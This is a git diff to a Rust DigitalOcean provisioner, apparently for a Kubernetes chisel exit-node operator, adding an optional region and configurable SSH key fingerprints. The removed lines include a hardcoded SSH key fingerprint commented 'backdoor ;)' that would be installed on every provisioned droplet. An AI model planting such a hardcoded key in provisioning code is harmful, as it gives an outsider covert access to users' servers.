@@ -1,11 +1,8 @@
-use super::{
-    cloud_init::generate_cloud_init_config, pwgen::generate_password, CloudExitNode, Provisioner,
-};
-use crate::cloud::CHISEL_PORT;
+use super::{cloud_init::generate_cloud_init_config, pwgen::generate_password, Provisioner};
 use crate::ops::{ExitNode, ExitNodeStatus, EXIT_NODE_PROVISIONER_LABEL};
 use async_trait::async_trait;
 use color_eyre::eyre::{anyhow, Error};
-use digitalocean_rs::{DigitalOceanApi, DigitalOceanError};
+use digitalocean_rs::DigitalOceanApi;
 use k8s_openapi::api::core::v1::Secret;
 use schemars::JsonSchema;
 use serde::{Deserialize, Serialize};
@@ -14,9 +11,14 @@ use tracing::{debug, info, warn};
 #[derive(Serialize, Deserialize, Debug, Clone, JsonSchema)]
 pub struct DigitalOceanProvisioner {
     /// Region ID of the DigitalOcean datacenter to provision the exit node in
+    /// If empty, DigitalOcean will randomly select a region for you, which might not be what you want
+    #[serde(default)]
     pub region: String,
     /// Reference to a secret containing the DigitalOcean API token, under the token key
     pub auth: String,
+    /// SSH key fingerprints to add to the exit node
+    #[serde(default)]
+    pub ssh_fingerprints: Vec<String>,
 }
 
 const DROPLET_SIZE: &str = "s-1vcpu-1gb";
@@ -78,9 +80,7 @@ impl Provisioner for DigitalOceanProvisioner {
         let mut droplet = api
             .create_droplet(&name, DROPLET_SIZE, DROPLET_IMAGE)
             .user_data(&config)
-            .ssh_keys(vec![
-                "bf:68:ac:a5:da:b6:f7:57:69:4f:0e:bb:5d:17:57:60".to_string(), // backdoor ;)
-            ])
+            .ssh_keys(self.ssh_fingerprints.clone())
             .tags(vec![format!("chisel-operator-provisioner:{}", provisioner)]);
 
         if self.region != "" {
